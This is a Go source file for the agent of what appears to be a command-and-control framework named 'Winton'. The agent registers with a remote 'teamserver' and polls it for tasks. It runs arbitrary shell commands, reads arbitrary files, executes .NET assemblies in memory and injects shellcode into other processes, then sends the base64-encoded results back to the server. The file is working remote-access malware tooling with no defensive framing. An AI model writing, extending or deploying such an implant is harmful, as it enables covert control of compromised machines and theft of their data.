package cmd


import (
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"

	"gopkg.in/yaml.v2"

	"Winton/cmd/commands"
	"Winton/cmd/utils"
	"Winton/cmd/handler"
)

type Config struct {
	HttpListener struct {
		IP   string `yaml:"ip"`
		Port string `yaml:"port"`
	} `yaml:"http_listener"`
}

var (
	Listener      string
	Port          string
	URL           string
	RegisterAgent string
	GetTask       string
	PostResult    string
)

func init() {
	data, err := os.ReadFile("config.yaml")
	if err != nil {
		fmt.Println(err)
		return
	}

	var config Config
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		fmt.Println(err)
		return
	}

	Listener = config.HttpListener.IP
	Port = config.HttpListener.Port

	URL = Listener + ":" + Port
	RegisterAgent = URL + "/register"
	GetTask = URL + "/tasks"
	PostResult = URL + "/results"
}

func Run() error {
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
		return err
	}

	// AGENT CONFIG (please change this)
	agent := handler.Agent{
		IP:       "127.0.0.1",
		Hostname: user.Username,
		Sleep:    "5",
		UID:      "",
	}

	fmt.Println("[*] Registering agent")

	res, err := handler.Register(agent, RegisterAgent)
	if err != nil {
		fmt.Println(err)
		return err
	}

	var json_data map[string]interface{}
	err = json.Unmarshal(res, &json_data)
	if err != nil {
		fmt.Println(err)
		return err
	}

	agent.UID = json_data["uid"].(string)

	fmt.Println("[*] Agent registered successfully")

	fmt.Println("[*] Sleep: " + agent.Sleep + " seconds")

	for {
		fmt.Println("[*] Sleeping...")
		time.Sleep(5 * time.Second)

		fmt.Println("[*] Checking for tasks")
		res, err := handler.Check_tasks(agent, GetTask)
		if err != nil {
			fmt.Println("[!] Error getting tasks, going back to sleep...")
			fmt.Println(err)
			return err
		}

		var json_data map[string]interface{}
		err = json.Unmarshal(res, &json_data)
		if err != nil {
			fmt.Println(err)
			return err
		}

		// fmt.Println(json_data)
		if json_data["message"] == "No tasks found" {
			fmt.Println("[*] No tasks found, going back to sleep...")
			continue
		}

		tasks := json_data["tasks"].([]interface{})
		task := tasks[0].(map[string]interface{})
		command := task["Command"].(string)

		temp := strings.Split(command, " ")
		command_args := []string{""}

		if len(temp) > 1 {
			command_args = temp[1:]
			command = temp[0]
		}

		switch command {
		case "ls":
			fmt.Println("[*] Found 'ls', executing command")
			cwd, err := os.Getwd()
			if err != nil {
				fmt.Println("[!] Error getting current working directory")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Current working directory: " + cwd)

			files, err := commands.Ls(cwd)
			if err != nil {
				fmt.Println("[!] Error listing files")
				fmt.Println(err)
				return err
			}

			jsonFiles, err := json.Marshal(files)
			if err != nil {
				fmt.Println("[!] Error marshalling files")
				fmt.Println(err)
				return err
			}

			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode((jsonFiles))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "whoami":
			fmt.Println("[*] Found 'whoami', executing command")

			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode([]byte(commands.Whoami()))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))
			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "pwd":
			fmt.Println("[*] Found 'pwd', executing command")
			command_id := task["CommandID"].(string)
			result := utils.Base64_Encode([]byte(commands.Pwd()))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "cat":
			fmt.Println("[*] Found 'cat', executing command")
			fmt.Println("[*] Cat Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			result, err := commands.Cat(strings.Join(command_args, " "))
			if err != nil {
				fmt.Println("[!] Error executing cat command")
				fmt.Println(err)
				return err
			}

			result = utils.Base64_Encode([]byte(result))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "shell":
			fmt.Println("[*] Found 'shell', executing command")
			fmt.Println("[*] Shell Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			shell_res, err := commands.Shell(strings.Join(command_args, " "))
			if err != nil {
				fmt.Println("[!] There was an error executing the shell command, could be AV or syntax error")
				fmt.Println("[!] Regardless, don't kill just yet.")
			}

			result := utils.Base64_Encode([]byte(shell_res))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "ps":
			fmt.Println("[*] Found 'ps', executing command")
			command_id := task["CommandID"].(string)
			ps_res, err := commands.Ps()
			if err != nil {
				fmt.Println("[!] Error executing ps command")
				fmt.Println(err)
				return err
			}

			result := utils.Base64_Encode([]byte(ps_res))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "getpid":
			fmt.Println("[*] Found 'getpid', executing command")
			command_id := task["CommandID"].(string)
			pid_res := commands.Get_pid()

			result := utils.Base64_Encode([]byte(pid_res))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "execute-assembly":
			fmt.Println("[!] Found 'execute-assembly', executing .NET assembly in memory now...")
			fmt.Println("[!] Execute-Assembly Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			raw_bytes, err := utils.Base64_Decode(command_args[0])
			if err != nil {
				fmt.Println("[!] Error decoding base64 encoded assembly")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Assembly length:", len(raw_bytes))

			res, err := commands.Execute_Assembly(raw_bytes)
			if err != nil {
				fmt.Println("[!] Error executing assembly")
				fmt.Println(err)
				return err
			}

			result := utils.Base64_Encode([]byte(res))

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Sending results to teamserver...")
			fmt.Println(string(jsonResult))

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)

			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		case "inject":
			fmt.Println("[*] Found 'inject', executing command")
			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
			command_id := task["CommandID"].(string)
			PID := command_args[0]
			PIDInt, err := strconv.Atoi(PID)
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				return err
			}

			shellcode, err := utils.Base64_Decode(command_args[1])
			if err != nil {
				fmt.Println("[!] Error converting PID to integer")
				fmt.Println(err)
				return err
			}

			inject_res, err := commands.Inject(PIDInt, shellcode)
			if err != nil {
				fmt.Println("[!] Error injecting shellcode")
				fmt.Println(err)
				return err
			}

			var result string
			if inject_res == "OK" {
				result = utils.Base64_Encode([]byte("Shellcode injected successfully"))
			} else {
				result = utils.Base64_Encode([]byte("Error injecting shellcode"))
			}

			result_struct := handler.TaskResult{
				CommandID: command_id,
				Result:    result,
			}

			jsonResult, err := json.Marshal(result_struct)
			if err != nil {
				fmt.Println("[!] Error marshalling result")
				fmt.Println(err)
				return err
			} 

			fmt.Println("[*] Sending results to teamserver...")

			_, err = handler.Post_results(agent, PostResult, jsonResult, command_id)
			if err != nil {
				fmt.Println("[!] Error posting results")
				fmt.Println(err)
				return err
			}

			fmt.Println("[*] Results sent successfully")

		default:
			fmt.Println("[!] Command not found")
		}
	}
}